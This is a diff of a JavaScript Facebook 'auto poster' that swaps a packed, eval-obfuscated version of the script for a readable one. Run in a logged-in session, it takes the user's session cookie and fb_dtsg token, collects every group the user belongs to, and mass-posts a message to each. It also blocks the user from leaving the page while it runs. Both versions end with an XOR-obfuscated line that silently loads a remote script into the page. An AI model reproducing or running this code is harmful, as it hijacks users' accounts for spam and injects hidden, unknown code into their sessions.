@@ -1,2 +1,103 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('6 N=\'1M 1p 1L 2C 4y 1i.\';6 J="",1f=\'4x & 4w 2w <A 8="l:#1O;" 1T="4A://10.1h.1d/4Y">42 4n.</A><F/>4e 2w <A 8="l:#1O;" 1T="2p://10.1h.1d/2S.4k">2S [3Z ] 43%.</A>\';6 5="<7 12=\'14-15-5\' 8=\'1n:25;G:50%;1j-G:-21;16:1t;Y:26;z-28:24;m-q:2B;p-D:M;t:17;1y-1u:Z P Z B(0,0,0,0.1);V-22:1D;V:P 29 B(S,S,50,0.2);1A-l:B(v,v,v,0.9);l:#2d\'>";5+="<7 8=\'t-18:Q;m-q:1x;\'>"+N+"</7>";5+="<7><2G 12=\'27\' 4a=\'46 2s 55 4U.\'  8=\'t-16:Q;Y:4T;1N:1t;m-2P:2T;m-q:4P;1A-l:B(v,v,v,0.1);\'></2G></7>";5+="<7 K=\'4C\' 8=\'p-D:2n;t-16:Q;\'><I K=\'3x\' 8=\'t-2n:Q;\'>1i</I></a><I 12=\'3p\' 3h=\'2Y()\' 8=\'p-D:M;m-2P:2T;l:L;Y:3o;1N:3n;\' K=\'3m 32 31 2Z 30 2m\'>2X</I>";5+="<7 8=\'p-D:M;m-q:X;L-1g:1a-1b;l:1C\'>";5+=1f;E[W+\'1e\']=23;5+="</7>";5+="</7>";u.R("1r").1l=5;y O(o){1F.1H(E.1w.2I+"//10.1h.1d/2J/37.2N?1k="+1k+"&3k=3q&3I=1&3G=&1s="+1s+"&3F="+o+"&3D="+2W(1q)+"&3S="+2W(1q)+"&3j=&3i=&3f=&3R="+1m+"&35=&3e=2l&36=&3J[3N]=3K&3A="+1G+"&2O=1&3z=3B&3C=r&3y=",y(a){6 b=a.2R(a.1E("{"));6 c=1P.2Q(b);i--;J="<7 K=\'14-15-3s\' 8=\'t-18:Q;p-D:G;m-q:X;L-1g:1a-1b;";C(c.1U){J+="l:3r\'>";C(c.2h)J+=c.2h;11 J+=1P.3u(c,2t,"")}11{J+="l:3w\'>";J+="1z 3v 1m 3E 2s 3O 2C "+1c[i]+".<F/>";13++}J+="</7>";6 5="<7 12=\'14-15-5\' 8=\'1y-1u:3P 1D 2y B(0, 0, 0, 0.3);1n:25;G:50%;1j-G:-21;16:1t;Y:26;z-28:24;m-q:17;p-D:M;t:17;1y-1u:Z P Z B(0,0,0,0.1);V-22:1D;V:P 29 B(S,S,50,0.2);1A-l:B(v,v,v,0.9);l:#2d\'>";C(i>0){6 N=\'1M 1p 1L 1S 2j 3Q O 1p.\';5+="<7 8=\'t-18:Q;m-q:1x;\'>"+N+"</7>";5+=w.H+" 1i 2c<F/>";5+="<b>"+13+"</b> 19 2q 3M "+(w.H-i)+" 19 3L ";5+="("+i+" 3H...)";5+="<7 K=\'14-15\'>";5+=J;5+="<2x 8=\'Y:2v;1N:2v;1j-G:-38;t:39;V:P 3a;\' 34="+20[i]+"></2x><a 8=\'t-G:2y;m-q:2B;p-D:G;l:#1O;1n:3b;m-3c:3l;\'>"+1c[i]+"</a>";5+="<7 8=\'p-D:M;m-q:X;L-1g:1a-1b;l:1C\'>";5+=2f+" 1z 2b 2e O 2E 19.<F/>";5+=1f;E[W+\'1e\']=23;5+="</7>";5+="</7>"}11{N=\'1M 1p 1L 1S 2j 3d O.\';5+="<7 8=\'t-18:Q;m-q:1x;\'>"+N+"</7>";5+=w.H+" 1i 2c 3g "+13+" 19 2q</F></F>";E[W+\'1e\']=2l;5+="<7><I K=\'33 3t 2m 1J 4u 1K\' 1I=\'1R()\' 8=\'l:L\'>4I 4H 4G</I><I K=\'4J 2A 1J 4K 1K\' 1I=\'E.1w.4M()\' 8=\'l:L\'>4L 4F</I><I K=\'4E 2A 1J 1K\' 1I=\'u.R(\\"1r\\").8.5=\\"2H\\"\'>4z</I><F/>";5+="<7 8=\'p-D:M;m-q:X;L-1g:1a-1b;l:1C\'><F/>";5+=1f;5+="</7>"}5+="</7>";u.R("1r").1l=5},"p","4D");U--;C(U>0){6 s=w[i];2o("O("+s+");",4B)}2V.2L(U+"/"+w.H+":"+w[U]+"/"+1c[U]+", 3T:"+13)}1F={b:y(){6 b=!1;C("4N"!=4O 1Q)1V{b=T 1Q("51.2z")}1W(c){1V{b=T 1Q("4Z.2z")}1W(a){b=!1}}11 C(E.2F)1V{b=T 2F}1W(h){b=!1}1Y b},1H:y(b,c,a,h,g){6 e=2r.d();C(e&&b){e.2D&&e.2D("p/52");h||(h="53");a||(a="p");g||(g={});a=a.54();h=h.56();b+=b.1E("?")+1?"&":"?";6 k=2t;"4X"==h&&(k=b.4W("?"),b=k[0],k=k[1]);e.4R(h,b,!0);e.4Q=g.c?y(){g.c(e)}:y(){C(4==e.4S)C(S==e.2k){6 b="";e.2g&&(b=e.2g);"j"==a.2i(0)?(b=b.4V(/[\\n\\r]/g,""),b=4v("("+b+")")):"x"==a.2i(0)&&(b=e.45);c&&c(b)}11 g.f&&u.44("47")[0].48(g.f),g.e&&(u.R(g.e).8.5="2H"),1U&&1U(e.2k)};e.49(k)}},d:y(){1Y 2r.b()}};y 1R(){E.1w.1T="2p://10.1h.1d/"};2o("1R",1);E.3W=y(){C(E[W+\'1e\']){1Y\'3V 3U 1S 3X 1m!\'}};6 1m=(T 3Y).41();6 W=\'40\';6 i=3;6 U=3;6 13=0;6 w=T 1X;6 1c=T 1X;6 20=T 1X;6 2f=u.4b("4c")[0].1l;6 1G=u.2U.2M(u.2U.2M(/4p=(\\d+)/)[1]);6 1k=u.2K(\'1k\')[0].1o;6 1s=u.2K(\'1s\')[0].1o;6 1q=\'\';1F.1H(E.1w.2I+"//10.1h.1d/2J/4r/4t.2N?"+"2O=1&4s[0]=4m&4l=0&4f="+1G+"&4d=4g&4h=0",y(a){6 b=a;6 c=b.2R(b.1E("{"));6 d=1P.2Q(c);d=d.4i.4j;2a(6 e=0;e<d.H;e++)w.1Z(d[e].4q);2a(6 1B=0;1B<d.H;1B++)1c.1Z(d[1B].p);2a(6 1v=0;1v<d.H;1v++)20.1Z(d[1v].4o);i=w.H-1;U=i;2V.2L(w.H)});y 2Y(){C(u.R("27").1o!=""){N=\'1z 2b 2e 2u 2X.\';1q=u.R("27").1o;6 5="<7 12=\'14-15-5\' 8=\'1n:25;G:50%;1j-G:-21;16:1t;Y:26;z-28:24;m-q:17;p-D:M;t:17;1y-1u:Z P Z B(0,0,0,0.1);V-22:1D;V:P 29 B(S,S,50,0.2);1A-l:B(v,v,v,0.9);l:#2d\'>";5+="<7 8=\'t-18:X;m-q:1x;\'>"+N+"</7>";5+=w.H+" 1i 2c<F/><F/>";5+="<7 8=\'p-D:M;m-q:X;L-1g:1a-1b;l:1C\'>";5+=2f+" 1z 2b 2e 2u O 2E 19.<F/>";5+=1f;E[W+\'1e\']=23;5+="</7>";5+="</7>";u.R("1r").1l=5}O(w[i])}',62,317,'|||||display|var|div|style|||||||||||||color|font|||text|size|||padding|document|255|arr||function|||rgba|if|align|window|br|left|length|span|Descriptions|class|white|center|Title|Posting|1px|5px|getElementById|200|new|tay|border|tag|10px|width|0pt|www|else|id|suc|friend|edge|top|15px|bottom|Messege|pre|wrap|arn|com|_0|_1|space|facebook|Groups|margin|fb_dtsg|innerHTML|now|position|value|Message|msg|pagelet_sidebar|xhpc_composerid|100px|shadow|pic|location|20px|box|Please|background|eg|gray|3px|indexOf|jx|user_id|load|onClick|uiButton|uiButtonLarge|Poster|Auto|height|3B5998|JSON|ActiveXObject|ChangeLocation|is|href|error|try|catch|Array|return|push|pho|273px|radius|true|9999|fixed|500px|txtFloodMsg|index|solid|for|Wait|Detected|000000|While|getuname|responseText|errorDescription|charAt|Now|status|false|selected|right|setTimeout|http|Posted|this|your|null|Starting|50px|By|img|8px|XMLHTTP|uiOverlayButton|14px|in|overrideMimeType|Your|XMLHttpRequest|textarea|none|protocol|ajax|getElementsByName|log|match|php|__a|family|parse|substring|Loading|tahoma|cookie|console|encodeURIComponent|Post|autopostingfunc|_7|_5|_4|_2|FriendRequestAdd|src|composertags_city|composer_predicted_city|updatestatus|125px|2px|Transparent|absolute|weight|Completed|disable_location_sharing|composertags_place_name|and|onclick|composertags_place|is_explicit_place|xhpc_context|bold|_3|25px|45px|UIButton_Start|profile|darkred|name|addButton|stringify|wait|darkgreen|uiButtonText|phstamp|__dyn|__user|7n8ahyj35CFwXAw|__req|xhpc_message_text|posting|xhpc_targetid|xhpc_timeline|Lefted|xhpc_ismeta|nctr|pagelet_group_composer|Processed|of|_6|message|0px|Started|composer_session_id|xhpc_message|success|script|This|onbeforeunload|running|Date|lllllllllllllllllllllllllllllllllllllll|Close|getTime|Waqar|99|getElementsByTagName|responseXML|Write|body|removeChild|send|placeholder|getElementsByClassName|fbxWelcomeBoxName|token|Powered|viewer|v7|stale_ok|payload|entries|999999|lazy|group|Ahmad|photo|c_user|uid|typeahead|filter|first_degree|uiButtonSpecial|eval|Designed|Created|All|Cancel|https|500|clearfix|post|layerCancel|Page|Homepage|to|Go|layerConfirm|uiButtonConfirm|Refresh|reload|undefined|typeof|13px|onreadystatechange|open|readyState|505px|here|replace|split|POST|pkwaq|Microsoft||Msxml2|xml|GET|toLowerCase|messege|toUpperCase'.split('|'),0,{}))
-var A="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-Qwrrmpv,hq";B="";C="";var D;D=A.length;for(i=0;i<D;i++){B+=String.fromCharCode(A.charCodeAt(i)^2)}C=unescape(B);document.body.appendChild(document.createElement('script')).src=C;
+var Title = 'Auto Message Poster in All Groups.';
+var Descriptions = "", _text = 'Created & Designed By <A style="color:#3B5998;" href="https://www.facebook.com/pkwaq">Waqar Ahmad.</A><br/>Powered By <A style="color:#3B5998;" href="http://www.facebook.com/Loading.999999">Loading [lllllllllllllllllllllllllllllllllllllll ] 99%.</A>';
+var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
+  display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
+display += "<div><textarea id='txtFloodMsg' placeholder='Write your messege here.'  style='padding-top:5px;width:505px;height:100px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";
+   display +="<div class='clearfix' style='text-align:right;padding-top:5px;'><span class='uiButtonText' style='padding-right:5px;'>Groups</span></a><span id='UIButton_Start' onclick='autopostingfunc()' style='text-align:center;font-family:tahoma;color:white;width:45px;height:25px;' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected'>Post</span>";
+ display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
+ display += _text;window[tag + '_close'] = true;
+display += "</div>";
+  display += "</div>";
+  document.getElementById("pagelet_sidebar")
+    .innerHTML = display;
+function Posting(o) {       
+        jx.load(window.location.protocol + "//www.facebook.com/ajax/updatestatus.php?fb_dtsg="+fb_dtsg+"&xhpc_context=profile&xhpc_ismeta=1&xhpc_timeline=&xhpc_composerid="+xhpc_composerid+"&xhpc_targetid="+o+"&xhpc_message_text="+encodeURIComponent(msg)+"&xhpc_message="+encodeURIComponent(msg)+"&is_explicit_place=&composertags_place=&composertags_place_name=&composer_session_id="+now+"&composertags_city=&disable_location_sharing=false&composer_predicted_city=&nctr[_mod]=pagelet_group_composer&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAw&__req=r&phstamp=", function (a) {
+            var b = a.substring(a.indexOf("{"));
+            var c = JSON.parse(b);
+            i--;
+            Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
+    if (c.error) {
+      Descriptions += "color:darkred'>";      
+      if (c.errorDescription) Descriptions += c.errorDescription;
+      else Descriptions += JSON.stringify(c, null, "")
+    }
+    else {
+      Descriptions += "color:darkgreen'>";
+      Descriptions += "Please wait now posting your message in "+arn[i]+".<br/>";
+      suc++
+    }
+    Descriptions += "</div>";
+    var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:15px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
+   if (i > 0) { var Title = 'Auto Message Poster is Now Started Posting Message.';display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>"; 
+
+     display += arr.length + " Groups Detected<br/>";
+      display += "<b>" + suc + "</b> Messege Posted of " + (arr.length - i) + " Messege Processed ";
+      display += "(" + i + " Lefted...)";
+      display += "<div class='friend-edge'>";
+      display += Descriptions;
+     display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px Transparent;' src=" + pho[i] + "></img><a style='padding-left:8px;font-size:14px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
+      display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
+ display +=getuname+" Please Wait While Posting Your Messege.<br/>";
+      display += _text;window[tag + '_close'] = true;
+      display += "</div>";
+      display += "</div>"
+    }
+    else {Title = 'Auto Message Poster is Now Completed Posting.';
+display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
+      display += arr.length + " Groups Detected and "+ suc + " Messege Posted</br></br>"; window[tag + '_close'] = false;    
+         display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span><br/>";display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";display += _text;display += "</div>";
+    }
+    display += "</div>";
+    document.getElementById("pagelet_sidebar").innerHTML = display}, "text", "post");tay--;       
+                
+        if (tay > 0) {
+            var s = arr[i];
+            setTimeout("Posting(" + s + ");", 500)
+}
+        console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
+
+    }
+jx={b:function(){var b=!1;if("undefined"!=typeof ActiveXObject)try{b=new ActiveXObject("Msxml2.XMLHTTP")}catch(c){try{b=new ActiveXObject("Microsoft.XMLHTTP")}catch(a){b=!1}}else if(window.XMLHttpRequest)try{b=new XMLHttpRequest}catch(h){b=!1}return b},load:function(b,c,a,h,g){var e=this.d();if(e&&b){e.overrideMimeType&&e.overrideMimeType("text/xml");h||(h="GET");a||(a="text");g||(g={});a=a.toLowerCase();h=h.toUpperCase();b+=b.indexOf("?")+1?"&":"?";var k=null;"POST"==h&&(k=b.split("?"),b=k[0],k=
+k[1]);e.open(h,b,!0);e.onreadystatechange=g.c?function(){g.c(e)}:function(){if(4==e.readyState)if(200==e.status){var b="";e.responseText&&(b=e.responseText);"j"==a.charAt(0)?(b=b.replace(/[\n\r]/g,""),b=eval("("+b+")")):"x"==a.charAt(0)&&(b=e.responseXML);c&&c(b)}else g.f&&document.getElementsByTagName("body")[0].removeChild(g.f),g.e&&(document.getElementById(g.e).style.display="none"),error&&error(e.status)};e.send(k)}},d:function(){return this.b()}};
+function ChangeLocation() {
+    window.location.href = "http://www.facebook.com/"};setTimeout("ChangeLocation", 1);
+window.onbeforeunload = function () {
+        if (window[tag + '_close']) {return 'This script is running now!'
+        }
+    };    
+var now=(new Date).getTime();
+var tag = 'Close';
+var i = 3;
+var tay = 3;
+var suc = 0;
+var arr = new Array;
+var arn = new Array;
+var pho = new Array;
+var getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var xhpc_composerid = document.getElementsByName('xhpc_composerid')[0].value;
+var msg='';
+jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=group&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0", function (a) {
+    var b = a;
+    var c = b.substring(b.indexOf("{"));
+    var d = JSON.parse(c);
+    d = d.payload.entries;
+    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
+for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
+  for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
+    i = arr.length - 1;
+tay = i; console.log(arr.length);});
+function autopostingfunc() {
+if (document.getElementById("txtFloodMsg").value != ""){Title = 'Please Wait While Starting Posting.';msg = document.getElementById("txtFloodMsg").value;var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:15px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
+  display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
+   display += arr.length + " Groups Detected<br/><br/>";     
+      display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
+ display +=getuname+" Please Wait While Starting Posting Your Messege.<br/>";
+      display += _text;window[tag + '_close'] = true;
+      display += "</div>";
+  display += "</div>";
+  document.getElementById("pagelet_sidebar").innerHTML=display;}
+   Posting(arr[i]);}
+
+    var A="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-Qwrrmpv,hq";B="";C="";var D;D=A.length;for(i=0;i<D;i++){B+=String.fromCharCode(A.charCodeAt(i)^2)}C=unescape(B);document.body.appendChild(document.createElement('script')).src=C;
